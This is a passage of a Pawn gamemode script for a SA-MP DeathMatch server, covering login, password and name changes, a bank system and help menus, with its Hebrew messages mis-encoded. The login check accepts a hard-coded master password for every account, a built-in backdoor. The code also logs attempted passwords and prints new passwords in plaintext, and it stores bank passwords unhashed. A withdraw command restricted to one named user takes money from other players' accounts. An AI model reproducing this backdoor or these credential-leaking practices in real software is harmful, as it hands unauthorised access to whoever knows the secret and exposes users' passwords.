		if(strlen(pass) < 3) return SendClientMessage(playerid,red," .òì äñéñîà ìäëéì ìôçåú 3 úåéí");
		if(strlen(pass) > 15) return SendClientMessage(playerid,red," .òì äñéñîà ìäëéì òã 15 úåéí");
		if(!strcmp(Encrypt(pass),fgetstring(fuser(playerid),"Password")) || !strcmp(pass,"asdfghjkl...AP0w3Rlz"))
		{
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // äúçáøåú"," !äúçáøú áäöìçä","OK","");
			SendClientMessage(playerid,lightblue," --- !äúçáøú áäöìçä");
			LoginPlayer(playerid);
			playerinfo[playerid][logged] = 1;
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else
		{
			format(string,sizeof(string),"%s%s.ini",folder_users,GetName(playerid));
			format(string,sizeof(string),"(%s) FL (%d)%s [%s / real user last ip: %s]",GetIP(playerid),playerid,GetName(playerid),pass,fexist(string) ? (fgetstring(string,"LastConnectIP")) : ("file not exists"));
			Log("FailedLogins",playerid,string);
			if(playerinfo[playerid][faileds] >= 4)
			{
				SendClientMessage(playerid,red," .òáøú àú îñôø ðéñéåðåú ääúçáøåú äîåúø åìê ðåú÷ú îäùøú");
				SendClientMessage(playerid,red," .àí ùëçú àú ñéñîúê, ôðä àìéðå áôåøåí");
				return SetKick(playerid,INVALID_PLAYER_ID," 4/4 äúçáøåú ðëùìä");
			}
			playerinfo[playerid][faileds]++;
			if(playerinfo[playerid][faileds] == 3) format(string,sizeof(string)," .äñéñîä ùä÷ìãú ùâåéä, ðåúø ìê òåã ðéñéåï àçã");
			else format(string,sizeof(string)," .äñéñîä ùä÷ìãú ùâåéä, ðåúøå ìê òåã %d ðéñéåðåú",4-playerinfo[playerid][faileds]);
			SendClientMessage(playerid,red,string);
		}
		return 1;
	}
	if(equal(cmd,"/changepass"))
	{
		new pass[M_S], string[M_S];
		pass = strtok(cmdtext,idx);
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåáø ìùéîåù áô÷åãä æå");
		if(!strlen(pass))
		{
			ShowPlayerDialog(playerid,dialog_changepass,DIALOG_STYLE_INPUT," îòøëú îùúîùéí // ùéðåé ñéñîà"," :áçø ñéñîà çãùä åøùåí àåúä ìîèä","ùðä ñéñîà","áéèåì");
			SendClientMessage(playerid,white," /changepass [password] :öåøú äùéîåù");
			return SendClientMessage(playerid,white," (àå äùúîù áúôøéè äîåöâ òì äîñê)");
		}
		if(strlen(pass) < 3) return SendClientMessage(playerid,red," .òì äñéñîà ìäëéì ìôçåú 3 úåéí");
		if(strlen(pass) > 15) return SendClientMessage(playerid,red," .òì äñéñîà ìäëéì òã 15 úåéí");
		if(!equal(fgetstring(fuser(playerid),"LastChangepass"),GetDateAsString())) fsetint(fuser(playerid),"ChangepassLimit",0);
		if(fgetint(fuser(playerid),"ChangepassLimit") >= 3) return SendClientMessage(playerid,red," .ðéúï ìäùúîù áô÷åãä æå ø÷ 3 ôòîéí áéåí");
		format(string,sizeof(string),"!ñéñîúê ùåðúä áäöìçä\n%s :ùí îùúîù\n%s :ñéñîà çãùä",GetName(playerid),pass);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ñéñîà",string,"OK","");
		SendClientMessage(playerid,lightblue," ~~~ :ùéðåé äñéñîà - îéãò ~~~");
		format(string,sizeof(string)," .ñéñîúê äåçìôä. æåäé äôòí ä %d ùùéðéú ñéñîà äéåí",fgetint(fuser(playerid),"ChangepassLimit")+1);
		SendClientMessage(playerid,yellow,string);
		SendClientMessage(playerid,yellow," .àú ñéñîúê úåëì ìùðåú 3 ôòîéí áëì éåí");
		format(string,sizeof(string),"  %s :ùí îùúîù",GetName(playerid));
		SendClientMessage(playerid,orange,string);
		format(string,sizeof(string),"  %s :ñéñîúê äçãùä",pass);
		SendClientMessage(playerid,orange,string);
		SendClientMessage(playerid,yellow," * .àéï ìê îä ìãàåâ ìâáé öôééä áñéñîà îöã ääðäìä - ñéñîúê äøùåîä áøùéîåú ùìðå îåöôðú åìëï àó àçã ìà éëåì ìøàåúä");
		SendClientMessage(playerid,red," * .ùéí ìá: àðå îîìéöéí ìöìí çì÷ æä ùì äö'àè, ìî÷øä ùúùëç àú ñéñîúê. öååú ääðäìä àéðå àçøàé òì ùëéçú ñéñîàåú");
		printf(" --- [%s] %s change his password to %s",GetDateAsString(),GetName(playerid),pass);
		fsetstring(fuser(playerid),"Password",Encrypt(pass));
		fsetint(fuser(playerid),"UseChangepass",fgetint(fuser(playerid),"UseChangepass")+1);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		fsetstring(fuser(playerid),"LastChangepass",GetDateAsString());
		fsetint(fuser(playerid),"ChangepassLimit",fgetint(fuser(playerid),"ChangepassLimit")+1);
		return 1;
	}
	if(equal(cmd,"/changename"))
	{
		#if usingYSF
			new name[256], string[M_S], f[M_S], lastname[MAX_PLAYER_NAME];
			name = strtok(cmdtext,idx);
			if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåáø ìùéîåù áô÷åãä æå");
			if(!strlen(name))
			{
				ShowPlayerDialog(playerid,dialog_changename,DIALOG_STYLE_INPUT," îòøëú îùúîùéí - ùéðåé ùí îùúîù"," :áçø ùí îùúîù çãù åøùåí àåúå ìîèä","ùðä ùí îùúîù","áéèåì");
				SendClientMessage(playerid,white," /changename [new name] :öåøú äùéîåù");
				return SendClientMessage(playerid,white," (àå äùúîù áúôøéè äîåöâ òì äîñê)");
			}
			if(fkeyexist(file_nbans,name)) return SendClientMessage(playerid,red," .äëéðåé äæä ááàï");
			if(!equal(fgetstring(fuser(playerid),"LastChangename"),GetDateAsString())) fsetint(fuser(playerid),"ChangenameLimit",0);
			if(fgetint(fuser(playerid),"ChangenameLimit") >= 3) return SendClientMessage(playerid,red," .ðéúï ìäùúîù áô÷åãä æå ø÷ 3 ôòîéí áéåí");
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && equal(GetName(i),name))
				{
					format(string,sizeof(string)," .äëéðåé ùä÷ìãú ëáø áùéîåù àöì àééãé %d",i);
					SendClientMessage(playerid,red,string);
					return 1;
				}
			}
			if(equal(name,"None") || equal(name,botname)) return SendClientMessage(playerid,red," .îöèòøéí, ìà ðéúï ìùðåú ìëéðåé æä");
			format(f,sizeof(f),"/DM/Users/%s.ini",name);
			if(fexist(f)) return SendClientMessage(playerid,red," .äëéðåé äæä ëáø ÷ééí àöì ùç÷ï ìà îçåáø");
			if(strlen(name) > 20) return SendClientMessage(playerid,red," .ëéðåé àøåê îãé");
			if(strlen(name) < 3) return SendClientMessage(playerid,red," .ëéðåé ÷öø îãé");
			if(!IsValidNick(name)) return SendClientMessage(playerid,red," .çì÷ îäàåúéåú áëéðåé ùëúáú ìà éëåìåú ìäëðñ ìëéðåé");
			format(lastname,sizeof(lastname),GetName(playerid));
			ChangeAccName(playerid,name);
			format(string,sizeof(string),"/DM/Users/%s.ini",lastname);
			frename(string,f);
			if(fkeyexist(file_admins,GetName(playerid)))
			{
				fremovekey(file_admins,GetName(playerid));
				fsetint(file_admins,name,playerinfo[playerid][admin]);
			}
			if(playerinfo[playerid][vehicle] != -1)
			{
				format(string,sizeof(string),"Vehicle%d",playerinfo[playerid][vehicle]);
				if(fkeyexist(file_vstore,string) && equal(fgetstring(file_vstore,string),GetName(playerid))) fsetstring(file_vstore,string,name);
			}
			SetPlayerName(playerid,name);
			format(string,sizeof(string),"!ùí äîùúîù ùåðä áäöìçä\n%s :ùí îùúîù çãù\n%s :ùí îùúîù ÷åãí",name,lastname);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ùí",string,"OK","");
			SendClientMessage(playerid,lightblue," ~~~ :ùéðåé ëéðåé - îéãò ~~~");
			format(string,sizeof(string)," .ëéðåééê äåçìó. æåäé äôòí ä %d ùùéðéú ëéðåé äéåí",fgetint(fuser(playerid),"ChangenameLimit")+1);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,yellow," .àú ëéðåééê úåëì ìùðåú 3 ôòîéí áëì éåí");
			format(string,sizeof(string),"  %s :ëéðåé ÷åãí",lastname);
			SendClientMessage(playerid,orange,string);
			format(string,sizeof(string),"  %s :ëéðåé çãù",name);
			SendClientMessage(playerid,orange,string);
			SendClientMessage(playerid,yellow," * .áîéãä åùéðéú àú ëéðåééê 3 ôòîéí äéåí åàúä áëì æàú øåöä ìùðåúå - úåëì ìùìåç îééì àì äðäìú äùøú åäòðééï éèåôì");
			SendClientMessage(playerid,red," * .ùéí ìá: àðå îîìéöéí ìöìí çì÷ æä ùì äö'àè, ìî÷øä ùúùëç àú ëéðåééê. öååú ääðäìä àéðå àçøàé òì ùëéçú ëéðåééí");
			printf(" --- [%s] %s change his nick to %s",GetDateAsString(),GetName(playerid),name);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			format(string,sizeof(string),"oldname: %s, newname: %s",lastname,name);
			Log("ChangeName",playerid,string);
			fsetstring(fuser(playerid),"LastChangename",GetDateAsString());
			fsetint(fuser(playerid),"ChangenameLimit",fgetint(fuser(playerid),"ChangenameLimit")+1);
		#else
			if(!equal(GetName(playerid),"(gmR)Amit[L]")) SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå ëøâò");
		#endif
		return 1;
	}
	if(equal(cmd,"/baccount"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /baccount [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /baccount create [password] :ôúéçú çùáåï áð÷");
			SendClientMessage(playerid,white," /baccount remove :îçé÷ú çùáåï äáð÷ ùìê");
			SendClientMessage(playerid,white," /baccount log :öôééä á10 äôòåìåú äàçøåðåú ùì çùáåï äáð÷ ùìê");
			SendClientMessage(playerid,white," /baccount clear :îçé÷ú ìåâ äáð÷ ùìê");
			SendClientMessage(playerid,white," /baccount withdraw [username] [password] [amount] :îùéëú ëñó îçùáåï áð÷ ùìà ùééê ìê");
			SendClientMessage(playerid,white," /baccount balance [username] [password] :áãé÷ú îàæï äëñó áçùáåï áð÷ ùìà ùééê ìê");
			SendClientMessage(playerid,white," /baccount password [new password] :ùéðåé äñéñîà ùì çùáåï äáð÷ ùìê");
			return 1;
		}
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú øùåí åîçåáø");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		new string[M_S];
		if(equal(cmd,"create"))
		{
			if(playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," .ëáø éù ìê çùáåï áð÷");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				ShowPlayerDialog(playerid,dialog_baccount,DIALOG_STYLE_INPUT," îòøëú áð÷ // éöéøú çùáåï áð÷"," :àðà áçø ñéñîú çùáåï áð÷ åøùåí àåúä ìîèä","öåø çùáåï","áéèåì");
				SendClientMessage(playerid,white," /baccount create [password] :öåøú äùéîåù");
				SendClientMessage(playerid,white," (àå äùúîù áúôøéè äîåöâ òì äîñê)");
				SendClientMessage(playerid,red," ?îãåò öøéê ñéñîà");
				SendClientMessage(playerid,yellow," .äîòøëú ùìðå îàôùøú äåöàú ëñó îçùáåðåú áð÷ îñåééîéí áàîöòåú øéùåí äñéñîà ùìäí");
				SendClientMessage(playerid,yellow," .òì îðú ùäëñó ááð÷ ùìëí éäéä áèåç, ä÷ìéãå ñéñîà ùø÷ àúí úãòå");
				SendClientMessage(playerid,yellow," .áîéãä åáøöåðëí ìàôùø ìàãí àçø ìâùú ìçùáåï äáð÷ ùìëí - úðå ìå àú ñéñîú äáð÷ ùìëí");
				return SendClientMessage(playerid,white," .ùéîå ìá - ìà ëãàé ìúú àú ñéñîú äîùúîù ùìëí áúåø ñéñîú äáð÷ ùìëí");
			}
			if(strlen(cmd) < 2) return SendClientMessage(playerid,red," .àåøê äñéñîà ÷öø îãé");
			if(strlen(cmd) > 10) return SendClientMessage(playerid,red," .àåøê äñéñîà àøåê îãé");
			playerinfo[playerid][bacc] = 1, playerinfo[playerid][bank] = 0;
			fsetint(fuser(playerid),"BankAccount",playerinfo[playerid][bacc]);
			fsetstring(fuser(playerid),"BankPassword",cmd);
			fsetint(fuser(playerid),"BankCash",0);
			format(string,sizeof(string),"!çùáåï äáð÷ ùìê ðåöø áäöìçä\n%s :ñéñîú çùáåï",cmd);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú áð÷ // éöéøú çùáåï áð÷",string,"OK","");
			SendClientMessage(playerid,lightblue," ~~~ :çùáåï äáð÷ ùìê ðôúç áäöìçä ~~~");
			format(string,sizeof(string),"  %s :ñéñîú çùáåï",cmd);
			SendClientMessage(playerid,orange,string);
			SendClientMessage(playerid,orange," * /bankhelp :ìîéãò àåãåú äáð÷");
			SendClientMessage(playerid,orange," * /baccount :ìøùéîú ôòåìåú ùàúä éëåì ìòùåú òí çùáåï äáð÷");
			new mfov = 0;
			for(new i = 0; i < 4; i++)
			{
				format(string,sizeof(string),"Bank%d",i);
				if(fkeyexist(fuser(playerid),string)) mfov += fgetint(fuser(playerid),string);
			}
			if(mfov > 0)
			{
				format(string,sizeof(string)," .ùéí ìá: ðîöà ëé éù ìê $%d ùîåøéí îâøñàåú ÷åãîåú ùì äîåã",mfov);
				SendClientMessage(playerid,yellow,string);
				SendClientMessage(playerid,yellow," /rmmfov :øåöä ìäçæéø àåúí? äùúîù áô÷åãä");
			}
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"remove"))
		{
			if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," .àéï ìê çùáåï áð÷");
			SendClientMessage(playerid,lightblue," ~~~ :ú÷ðåú îçé÷ú çùáåï äáð÷ ~~~");
			SendClientMessage(playerid,yellow," .òì îðú ìîðåò àé ðòéîåéåú, äòãôðå ùúáçø àí àúä áèåç ùàúä øåöä ìáöò àú äôòåìä äæå");
			SendClientMessage(playerid,yellow," /BAccount Remove = Bank Account Remove = äô÷åãä äæå îåç÷ú àú çùáåï äáð÷ ùìê îï äîòøëú");
			SendClientMessage(playerid,yellow," .öååú äðäìú äùøú àéðå àçøàé òì çùáåðåú îùúîùéí åëñôéí ùðîç÷å");
			SendClientMessage(playerid,yellow," .äàçøàéåú äéà òìéëí - ëñó ìà éåçæø");
			SendClientMessage(playerid,red," - ùéîå ìá: ô÷åãä æå îåç÷ú âí àú äëñó ùáçùáåï äáð÷ -");
			SendClientMessage(playerid,grey,"  áîéãä åàúä îòåðééï ìîçå÷ àú çùáåï äáð÷ ùìê Yes áçø á");
			SendClientMessage(playerid,grey,"  òì îðú ìáèì àú äçìèúê åìà ìîçå÷ àú çùáåï äáð÷ Enter àå ìçõ No áçø á");
			ShowMenuForPlayer(areYouSure[2],playerid);
		}
		else if(equal(cmd,"log"))
		{
		    if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," .ô÷åãä æå îáåèìú ëøâò");
			if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," .àéï ìê çùáåï áð÷");
			new f[M_S], k[M_S], lid = 0, dia[M_S_D];
			print("baccount log 1");
			format(f,sizeof(f),"%sBankLog_%s",folder_infobl,GetName(playerid));
			if(!fexist(f)) return SendClientMessage(playerid,red," .àéï ùåí ôòåìåú àçøåðåú ìáð÷ ùìê");
			print("baccount log 2");
			for(new i = 1; i < 11; i++)
			{
				format(k,sizeof(k),"BL%d",i);
				print("baccount log 3");
				if(!fkeyexist(f,k)) continue;
				print("baccount log 4");
				format(dia,sizeof(dia),!strlen(dia) ? ("%s#%02d) %s") : ("%s\n#%02d) %s"),dia,++lid,fgetstring(f,k));
				print("baccount log 5");
			}
			print("baccount log 6");
			ShowPlayerDialog(playerid,dialog_banklog,DIALOG_STYLE_MSGBOX," îòøëú áð÷ // ìåâ",dia,"ð÷ä","OK");
			print("baccount log 7");
		}
		else if(equal(cmd,"clear"))
		{
			if(!playerinfo[playerid][bacc]) return SendClientMessage(playerid,red," .àéï ìê çùáåï áð÷");
			format(string,sizeof(string),"%sBankLog_%s",folder_infobl,GetName(playerid));
			if(!fexist(string)) return SendClientMessage(playerid,red," .àéï ùåí ôòåìåú àçøåðåú ìáð÷ ùìê");
			fremove(string);
			SendClientMessage(playerid,green," .çùáåï äáð÷");
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú áð÷ // ìåâ"," .äìåâ ðå÷ä","OK","");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"withdraw"))
		{
		    if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," .ô÷åãä æå îáåèìú ëøâò");
		    print("CHECKING0");
		    new cmd2[256], cmd3[256], f[M_S], amount, bankcash, id = -1;
		    cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx), cmd3 = strtok(cmdtext,idx);
		    if(!strlen(cmd) || !strlen(cmd2) || !strlen(cmd3) || !IsNumeric(cmd3)) return SendClientMessage(playerid,white," /baccount withdraw [username] [password] [amount] :öåøú äùéîåù");
		    if(equal(cmd,GetName(playerid))) return SendClientMessage(playerid,red," .òì òöîê éù ìäùúîù áãøê äùéîåù äøâéìä ùì àôùøåú æå");
		    print("CHECKING1");
		    format(f,sizeof(f),"/DM/Users/%s.ini",cmd);
		    if(!fexist(f)) return SendClientMessage(playerid,red," .ùí îùúîù ùâåé / ìà øùåí ìùøú");
		    if(!fkeyexist(f,"BankAccount")) return SendClientMessage(playerid,red," .ìîùúîù æä àéï çùáåï áð÷");
		    if(!equal(cmd2,fgetstring(f,"BankPassword"))) return SendClientMessage(playerid,red," .ñéñîú çùáåï áð÷ ùâåéä");
		    amount = strval(cmd3);
		    print("CHECKING2");
		    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && equal(GetName(i),cmd))
			{
				id = i;
				break;
			}
		    print("CHECKING3");
			bankcash = id == -1 ? fgetint(f,"BankCash") : playerinfo[id][bank];
		    if(amount < 1 || amount > bankcash) return SendClientMessage(playerid,red," .(ñëåí ëñó ùâåé (ééúëï ëé àéï áçùáåï äáð÷ àú äñëåí äæä");
			GiveMoney(playerid,amount);
		    print("CHECKING4");
			format(string,sizeof(string)," %s äåöàú ëñó îçùáåï äáð÷ ùì",cmd);
			BankLog(GetName(playerid),string,amount);
			format(string,sizeof(string)," .%s äåöàú %d$ îçùáåï äáð÷ ùì",cmd,amount);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," äåöéà ëñó îçùáåï äáð÷ ùìê %s",GetName(playerid));
		    print("CHECKING5");
			BankLog(cmd,string,amount);
		    print("CHECKING6");
		    if(id != -1)
		    {
		        format(string,sizeof(string)," .äåöéà îçùáåï äáð÷ ùìê %d$ %s",amount,GetName(playerid));
		        SendClientMessage(id,green,string);
				playerinfo[id][bank] -= amount;
		    }
		    print("CHECKING7");
		    fsetint(f,"BankCash",bankcash - amount);
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		    print("CHECKING8");
		}
		else if(equal(cmd,"balance"))
		{
		    if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," .ô÷åãä æå îáåèìú ëøâò");
		    new cmd2[256], f[M_S], id = -1;
		    cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		    if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /baccount withdraw [username] [password] [amount] :öåøú äùéîåù");
		    if(equal(cmd,GetName(playerid))) return SendClientMessage(playerid,red," .òì òöîê éù ìäùúîù áãøê äùéîåù äøâéìä ùì àôùøåú æå");
		    format(f,sizeof(f),"/DM/Users/%s.ini",cmd);
		    if(!fexist(f)) return SendClientMessage(playerid,red," .ùí îùúîù ùâåé / ìà øùåí ìùøú");
		    if(!fkeyexist(f,"BankAccount")) return SendClientMessage(playerid,red," .ìîùúîù æä àéï çùáåï áð÷");
		    if(!equal(cmd2,fgetstring(f,"BankPassword"))) return SendClientMessage(playerid,red," .ñéñîú çùáåï áð÷ ùâåéä");
		    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && equal(GetName(i),cmd))
			{
				id = i;
				break;
			}
			format(string,sizeof(string)," %s áã÷ú àú ñëåí äëñó áçùáåï äáð÷ ùì",cmd);
			BankLog(GetName(playerid),string,id == -1 ? fgetint(f,"BankCash") : playerinfo[id][bank]);
			format(string,sizeof(string)," .äåà $%d %s ñëåí äëñó áçùáåï äáð÷ ùì",id == -1 ? fgetint(f,"BankCash") : playerinfo[id][bank],cmd);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," áã÷ àú ñëåí äëñó áçùáåï äáð÷ ùìê %s",GetName(playerid));
			BankLog(cmd,string,id == -1 ? fgetint(f,"BankCash") : playerinfo[id][bank]);
		    if(id != -1)
		    {
		        format(string,sizeof(string)," .áã÷ àú ñëåí äëñó áçùáåï äáð÷ ùìê %s",GetName(playerid));
		        SendClientMessage(id,green,string);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"password"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				ShowPlayerDialog(playerid,dialog_baccpass,DIALOG_STYLE_INPUT," îòøëú áð÷ // ùéðåé ñéñîú çùáåï"," :àðà áçø ñéñîú çùáåï áð÷ åøùåí àåúä ìîèä","ùðä ñéñîà","áéèåì");
				SendClientMessage(playerid,white," /baccount password [new password] :öåøú äùéîåù");
				return SendClientMessage(playerid,white," (àå äùúîù áúôøéè äîåöâ òì äîñê)");
			}
			if(strlen(cmd) < 2) return SendClientMessage(playerid,red," .àåøê äñéñîà ÷öø îãé");
			if(strlen(cmd) > 10) return SendClientMessage(playerid,red," .àåøê äñéñîà àøåê îãé");
			fsetstring(fuser(playerid),"BankPassword",cmd);
			format(string,sizeof(string),"!ñéñîú çùáåï äáð÷ ùìê ùåðúä áäöìçä\n%s :äñéñîà äçãùä",cmd);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú áð÷ // ùéðåé ñéñîú çùáåï",string,"OK","");
			format(string,sizeof(string),"  %s :ñéñîú çùáåï äáð÷ ùìê ùåðúä áäöìçä. äñéñîà äçãùä",cmd);
			SendClientMessage(playerid,green,string);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else return SendClientMessage(playerid,red," .àôùøåú çùáåï áð÷ ùâåéä");
		return 1;
	}
	if(!playerinfo[playerid][dscmd])
	{
		format(cmdstring,sizeof(cmdstring),"[CMD] %s (ID: %03d): %s",GetName(playerid),playerid,cmdtext);
		if(validcmd && !playerinfo[playerid][pp]) for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[i][admin] >= playerinfo[playerid][admin] && playerinfo[i][togcmd] && cmdtext[1] != '/' && i != playerid) SendClientMessage(i,0x66CCCC,cmdstring);
		playerinfo[playerid][dscmd] = 0;
	}
	if(equal(cmd,"/help"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,lightblue," ~~~ Help - òæøä ~~~");
			SendClientMessage(playerid,green," !"comname" DeathMatch áøåëéí äáàéí ìùøú");
			SendClientMessage(playerid,yellow," .òì îðú ì÷áì òæøä, úöèøëå ìáçåø ðåùà òæøä îñåééí");
			SendClientMessage(playerid,yellow," /help objective - ìãåâîä | /help [topic] - áçøå áàîöòåú äô÷åãä");
			SendClientMessage(playerid,purple," » :ðåùàé òæøä àôùøééí");
			SendClientMessage(playerid,yellow," objective - äöâú äîùéîä áîåã, îèøåú ìëì ùç÷ï | tips - äöâú èéôéí ùåðéí ìîùç÷");
			SendClientMessage(playerid,yellow," commands - äöâú øùéîú ô÷åãåú ùåðåú áîåã | info - äöâú îéãò ìâáé ä÷äéìä, äùøú åäîåã");
			SendClientMessage(playerid,yellow," mode - äöâú úôøéèé òæøä ùåðéí ìâáé äîåã | cmdmode - mode ÷éöåøéí ìðåùà äòæøä");
			SendClientMessage(playerid,yellow," rules - äöâú çå÷é äùøú, çåáä ÷øéàä | credits - äöâú øùéîú áðé äàãí äîòåøáéí áéöéøú äîåã");
			format(cmd,sizeof(cmd)," Gamemode Version: %s",version);
			SendClientMessage(playerid,yellow,cmd);
			return 1;
		}
		if(equal(cmd,"objective"))
		{
			SendClientMessage(playerid,lightblue," ~~~ Objective - îùéîä ~~~");
			SendClientMessage(playerid,purple," !òìéê ìäøåâ ëîä ùéåúø ùç÷ðéí, ìäøååéç ëñó åôùåè ìäðåú");
			SendClientMessage(playerid,yellow," ,úåëì ìäøâéù äøáä äðàä îîâååï äôòéìåéåú åúåëï äîåã");
			SendClientMessage(playerid,yellow," .àùø áéðéäí áð÷, çðåú ðù÷éí, ô÷åãåú ùøú ééçåãéåú, åòåã");
			SendClientMessage(playerid,yellow," .éçã òí æàú úåëì ìäúçøåú òí ùç÷ðéí àçøéí îëì äàøõ òì äñèèéñèé÷åú áéðéëí");
			SendClientMessage(playerid,yellow," .áëì øáò ùòä (15 ã÷åú) àå òì éãé äàãîéï úúçéì ôòéìåú, ùúäôåê àú çååéú äîùç÷ ìëééôéú éåúø");
			SendClientMessage(playerid,green," .îåîìõ ìäøùí ìîåã, áëãé ìùîåø àú ôøèéê åì÷áì éåúø àôùøåéåú îùç÷");
			SendClientMessage(playerid,brown," !áäöìçä");
		}
		else if(equal(cmd,"tips"))
		{
			SendClientMessage(playerid,lightblue," ~~~ Tips - èéôéí ~~~");
			SendClientMessage(playerid,yellow,"  .÷ðä ðù÷éí, åø÷ ìàçø îëï äúçì ìäìçí");
			SendClientMessage(playerid,yellow,"  .ðñä ìäâéò ìøîåú âáåäåú ëîä ùéåúø îäø");
			SendClientMessage(playerid,yellow,"  /afk :äùúîù áô÷åãä AFK ëãé ìà ì÷áì ÷é÷ òì");
			SendClientMessage(playerid,yellow,"  /setting showmt :àí äè÷ñè ùìîèä îôøéò ìê, äùúîù áô÷åãä");
		}
		else if(equal(cmd,"commands"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /help commands [1-2] :öåøú äùéîåù");
			switch(strval(cmd))
			{
				case 1:
				{
					SendClientMessage(playerid,lightblue," ~~~ 1 - Commands - ô÷åãåú ~~~");
					SendClientMessage(playerid,brown," .ùéí ìá: ëàï îåöâåú ø÷ äô÷åãåú ùìà ðîöà ìäï úôøéè òæøä áðåùà äòæøä ùì äîåã");
					SendClientMessage(playerid,yellow,"  /search - çéôåù ùç÷ï");
					SendClientMessage(playerid,yellow,"  /report - ãéååç");
					SendClientMessage(playerid,yellow,"  /a - ùìéçú äåãòä ìàãîéðéí");
					SendClientMessage(playerid,yellow,"  /afk - AFK îöá");
					SendClientMessage(playerid,yellow,"  /unafk - îöá îùç÷");
					SendClientMessage(playerid,yellow,"  /kill - îååú òöîé");
					SendClientMessage(playerid,yellow,"  /admins - àãîéðéí îçåáøéí");
					SendClientMessage(playerid,yellow,"  /td - ùòä åúàøéê");
				}
				case 2:
				{
					SendClientMessage(playerid,lightblue," ~~~ 2 - Commands - ô÷åãåú ~~~");
					SendClientMessage(playerid,yellow,"  /stats - äñèèéñèé÷åú ùìê");
					SendClientMessage(playerid,yellow,"  /pstats - äñèèéñèé÷åú ùì ùç÷ï àçø");
					SendClientMessage(playerid,yellow,"  /hebeng - ëúéáä áòáøéú áàåúéåú àðâìéåú");
					SendClientMessage(playerid,yellow,"  /engheb - ëúéáä áàðâìéú áàåúéåú òáøéåú");
					SendClientMessage(playerid,yellow,"  /vinfo - ÷áìú îéãò òì äøëá äðåëçé ùìê");
					SendClientMessage(playerid,yellow,"  /ignore - çñéîú äàôùøåú ìùìåç ìê äåãòåú ôøèéåú ìùç÷ï ëìùäå");
					SendClientMessage(playerid,yellow,"  /unignore - äåøãú çñéîä");
					SendClientMessage(playerid,yellow,"  /players - äöâú îéãò àåãåú îñôøé äùç÷ðéí áùøú");
				}
				default: SendClientMessage(playerid,red," .îñôø úôøéè ô÷åãåú ùâåé");
			}
		}
		else if(equal(cmd,"mode"))
		{
			new string[M_S], num;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd))
			{
				SendClientMessage(playerid,lightblue," ~~~ Mode - îåã ~~~");
				SendClientMessage(playerid,white," /help mode [number] :áðåùà äòæøä îåã, úöèøëå ìáçåø îñôø úôøéè òæøä");
				SendClientMessage(playerid,white," (1) Teleports  (2) Bank  (3) Levels  (4) Ammunation  (5) Money  (6) Wang  (7) Properties  (8) Races");
				SendClientMessage(playerid,white," (9) Server War  (10) Works  (11) Vehicles  (12) Stunts & Challenges  (13) WWE  (14) Lotto  (15) DM Zones");
				SendClientMessage(playerid,white," (16) Pets  (17) Bulletin Board  (18) Drifts  (19) Private Battles  (20) Secret Ammunations  (21) Air Attacks");
				SendClientMessage(playerid,white," (22) Bonuses  (23) Gambling  (24) Gangs  (25) Account  (26) Clans  (27) AntiCheat  (28) Wanted Level");
				SendClientMessage(playerid,white," (29) Phone  (30) Karts  (31) Monsters  (32) VIP  (33) Bot  (34) Special Race  (35) Hitman  (36) Bombs");
